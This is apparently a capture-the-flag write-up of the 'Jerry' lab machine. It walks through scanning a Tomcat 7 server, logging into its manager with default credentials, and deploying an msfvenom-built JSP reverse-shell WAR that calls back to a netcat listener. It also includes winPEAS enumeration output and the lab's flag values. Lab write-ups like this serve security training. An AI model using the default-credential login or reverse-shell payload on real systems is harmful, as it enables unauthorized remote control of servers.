Box: Windows
Level Easy

### Index
1. Initial Enumeration
2. Running winPEAS.bat 
3. Uploading WAR file to get the reverse shell
4. grabbing the flag by just exploring the directories on the target

Nmap Scan
```
$ nmap -T4 --min-rate=1000 -p- -sC -sV -Pn 10.10.10.95
PORT     STATE SERVICE    VERSION
8080/tcp open  tcpwrapped

$ sudo nmap -p8080 -sV -sC -sS -A 10.10.10.95  
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)

```

Accessing port 8080 in Browser and clicking on "Manager App" reveals the default credentials.
![](Pasted%20image%2020240811003001.png)

Default Credentials - tomcat and s3cret
![](Pasted%20image%2020240811003030.png)

I need to clear the browser cache and again clicked on the "Manager App" to load the Login box where I provided the default credentials and it worked. Now time to upload the WAR file and get a reverse shell.

The following command was used to generate the JSP shell 
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f war > shell.war
Payload size: 1088 bytes
Final size of war file: 1088 bytes
```

Now uploading the shell.war file and starting the listener. This shell.war file was uploaded as an application and deployed.

```
$ nc -lvnp 4444                                       
listening on [any] 4444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Although, The reverse shell gave me the "NT AUTHORITY\SYSTEM" shell, there was no folder for any other user. The "Administrator" folder was present but no sign of root.txt file. Clearly it is trap. I will now use winPEAS.bat to enumerate the machine. I can also use the local_exploit_suggester. The Local_Exploit_Suggester did not suggest any exploit. Trying winPEAS.bat now.

Findings for winPEAS.bat are posted below.

```
Host Name:                 JERRY                                                                                                                        
OS Name:                   Microsoft Windows Server 2012 R2 Standard     
OS Version:                6.3.9600 N/A Build 9600 
Hotfix(s):                 142 Hotfix(s) Installed.

[+] Number of cached creds                                                                                                                              
    [i] You need System-rights to extract them
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    CACHEDLOGONSCOUNT    REG_SZ    10 

[+] UAC Settings                                                                                                                                       
    [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
    [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1  

[+] ENVIRONMENT                                                                                                                                             [i] Interesting information?
	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\Java\jdk1.8.0_171\bin; 
	PROCESSOR_ARCHITECTURE=AMD64
	PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\

[+] INSTALLED SOFTWARE     
   [i] Some weird software? Check for vulnerabilities in unknow software installed  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software  
	Internet Explorer           
	Internet Explorer           
	Java          
	Microsoft.NET 
	Update Services             
	VMware        
	Windows Mail  
	Windows Mail  
	Windows Media Player        
	Windows Media Player        
	Windows Multimedia Platform 
	Windows Multimedia Platform 
	Windows NT    
	Windows NT    
	Windows Photo Viewer        
	Windows Photo Viewer        
	Windows Portable Devices    
	Windows Portable Devices    
	WindowsPowerShell           
	WindowsPowerShell           
	    InstallLocation    REG_SZ    C:\Program Files\Java\jre1.8.0_171\  
	    InstallLocation    REG_SZ    C:\Program Files\Java\jdk1.8.0_171\  
	    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\  

[+] RUNNING PROCESSES      
   [i] Something unexpected is running? Check for vulnerabilities     
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
	Image Name         PID  Services             
	========================= ======== ============================================     
	System Idle Process0 N/A    
	System             4 N/A    
	smss.exe         204 N/A    
	csrss.exe        300 N/A    
	csrss.exe        364 N/A    
	wininit.exe      372 N/A    
	winlogon.exe     400 N/A    
	services.exe     460 N/A    
	lsass.exe        468 SamSs  
	svchost.exe      524 BrokerInfrastructure, DcomLaunch, LSM, PlugPlay, Power, SystemEventsBroker
	svchost.exe      552 RpcEptMapper, RpcSs  
	dwm.exe          636 N/A    
	svchost.exe      652 Dhcp, EventLog, lmhosts, Wcmsvc    
	svchost.exe      696 DsmSvc, gpsvc, iphlpsvc, LanmanServer,ProfSvc, Schedule, SENS, Themes, Winmgmt         
	svchost.exe      744 EventSystem, FontCache, netprofm, nsi, W32Time
	svchost.exe      812 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc, WinRM        
	svchost.exe      948 BFE, DPS, MpsSvc     
	spoolsv.exe      320 Spooler
	svchost.exe      452 DiagTrack            
	tomcat7.exe      504 Tomcat7
	conhost.exe      540 N/A    
	svchost.exe      712 TrkWks, UALSVC       
	VGAuthService.exe856 VGAuthService        
	vmtoolsd.exe    1092 VMTools
	ManagementAgentHost.exe       1132 VMwareCAFManagementAgentHost       
	svchost.exe     1460 PolicyAgent          
	WmiPrvSE.exe    1596 N/A    
	dllhost.exe     1684 COMSysApp            
	msdtc.exe       1888 MSDTC  
	LogonUI.exe     2216 N/A    
	cmd.exe         2832 N/A    
	conhost.exe     1848 N/A    
	WmiPrvSE.exe     140 N/A    
	TrustedInstaller.exe          2228 TrustedInstaller     
	TiWorker.exe    2988 N/A    
	tasklist.exe    2312 N/A

[i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
	..........................................Use HackTricks to search for File Backdooring................................................
	C:\apache-tomcat-7.0.88\bin\tomcat7.exe NT AUTHORITY\SYSTEM:(I)(F)    
	C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(F)   
	C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(F)        
	C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe BUILTIN\Administrators:(F)      
	C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)           
	C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.17709_none_fa7932f59afc2e40\TiWorker.exe NT SERVICE\TrustedInstaller:(F)

[i] Checking directory permissions of running processes (DLL injection)          
  C:\apache-tomcat-7.0.88\bin\ NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  C:\Program Files\VMware\VMware Tools\VMware VGAuth\ BUILTIN\Administrators:(OI)(CI)(F)
  C:\Program Files\VMware\VMware Tools\ BUILTIN\Administrators:(OI)(CI)(F)
  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ BUILTIN\Administrators:(OI)(CI)(F)
  C:\Windows\servicing\ NT SERVICE\TrustedInstaller:(F)
  C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.17709_none_fa7932f59afc2e40\ NT SERVICE\TrustedInstaller:(OI)(CI)(F)  

Folder: \Microsoft        
INFO: There are no scheduled tasks presently available at your access level.
Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.
Folder: \Microsoft\Windows\.NET Framework            
.NET Framework NGEN v4.0.30319           N/A                    Ready 
.NET Framework NGEN v4.0.30319 64        N/A                    Ready

[*] BASIC USER INFO
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege        
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
   USER INFORMATION            
   ----------------            

   User Name           SID     
   =================== ========
   nt authority\system S-1-5-18


   GROUP INFORMATION           
   -----------------           

   Group Name Type             SID          Attributes     
   ====================================== ================ ============ ==================================================       
   BUILTIN\Administrators   Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner           
   Everyone   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group       
   NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group       
   Mandatory Label\System Mandatory Level Label            S-1-16-16384  


   PRIVILEGES INFORMATION      
   ----------------------      

   Privilege Name    Description   State     
   =============================== ========================================= ========  
   SeTcbPrivilege                  Act as part of the operating system       Enabled  
   SeLockMemoryPrivilege           Lock pages in memory                      Enabled  
   SeSystemProfilePrivilege        Profile system performance                Enabled
   SeProfileSingleProcessPrivilege Profile single process                    Enabled
   SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
   SeCreatePagefilePrivilege       Create a pagefile                         Enabled
   SeCreatePermanentPrivilege      Create permanent shared objects           Enabled
   SeDebugPrivilege                Debug programs                            Enabled
   SeAuditPrivilege                Generate security audits                  Enabled
   SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
   SeImpersonatePrivilege          Impersonate a client after authentication Enabled   
   SeCreateGlobalPrivilege         Create global objects                     Enabled   
   SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled   
   SeTimeZonePrivilege             Change the time zone                      Enabled   
   SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
   SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled 
   SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled  
   SeSecurityPrivilege             Manage auditing and security log          Disabled  
   SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled  
   SeLoadDriverPrivilege           Load and unload device drivers            Disabled    
   SeSystemtimePrivilege           Change the system time                    Disabled  
   SeBackupPrivilege Back up files and directories                           Disabled  
   SeRestorePrivilegeRestore files and directories                           Disabled  
   SeShutdownPrivilege             Shut down the system                      Disabled  
   SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled  
   SeUndockPrivilege               Remove computer from docking station      Disabled  
   SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled  
  

[+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY       
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services  
   ............The List is too Long But worth giving a try......................
  You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework
  You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{E6565A26-EF2E-43A5-A579-B0F25E7B1DC8}

[*] CREDENTIALS 
 [+] WINDOWS VAULT          
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault
   Currently stored credentials:             
    Target: WindowsLive:target=virtualapp/didlogical    
    Type: Generic           
    User: 02kvofoqiskb      
    Local machine persistence
    
	Looking inside C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials\
	DFBE70A7E5CC19A398EBF1B96859CE5D  
	
[+] Files in registry that may contain credentials     
  [i] Searching specific files that may contains credentials.        
  [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
  Looking inside HKCU\Software\ORL\WinVNC3\Password       
  Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password   
  Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon           
      LastUsedUsername    REG_SZ            
  Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP            
  Looking inside HKCU\Software\TightVNC\Server            
  Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions 
  Looking inside HKCU\Software\OpenSSH\Agent\Keys  
```

Further Strategies to capture the flag
1. UAC Setting - Value is set to 0x1. 
	 -   I tried. But the Exploitation process requires the GUI access to run HHUPD.EXE as an administrator and pull out certification info. I did not have access to GUI.
2. Privilege Escalation using Enabled Privileges. Look at Enabled Privileges on this box. Specially SeImpersonatePrivilege. Any Potato Exploit might work.
	- None of the Potato Exploit work. I compiled few of the Exploit using VS Code 2019 and ran on the target box but none of them was giving me a shell other than "NT Authority\SYSTEM". I was under impression that "NT Authority\System" is a low privilege user created to confuse the tester. Turns out I was wrong. It was indeed a high privilege user. 
3. File Back Dooring
5. Files Inside the registry that may contains the credentials.
6. DLL Injection
7. Digging up Running Processes 

Turns out that I need to pay more attention at the directories. 

```
C:\Users\Administrator\Desktop\flags>whoami
whoami
nt authority\system
```

Initially I got the shell as the "NT AUTHORITY\System" account. I was wonder that this couldn't be that easy. I trap was that there was no user specific folder present under the C:\Users directory. Look at the following output.
```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/18/2018  11:31 PM    <DIR>          Administrator
08/22/2013  06:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,409,750,528 bytes free
```

However, I Was able to access the "Administrator" directory. but no root.txt present. but then I forgot to check other directories present inside the "Administrator" directory.
There was a "flag" directory present on C:\Users\Administrator\ folder.
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,409,750,528 bytes free
```

Just look at the output below.

```
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,409,750,528 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```

I got both the flag in one shot. The above strategies was a good learning curve but nothing was helpful to grab the flag. It turns out I just need to dig into directories.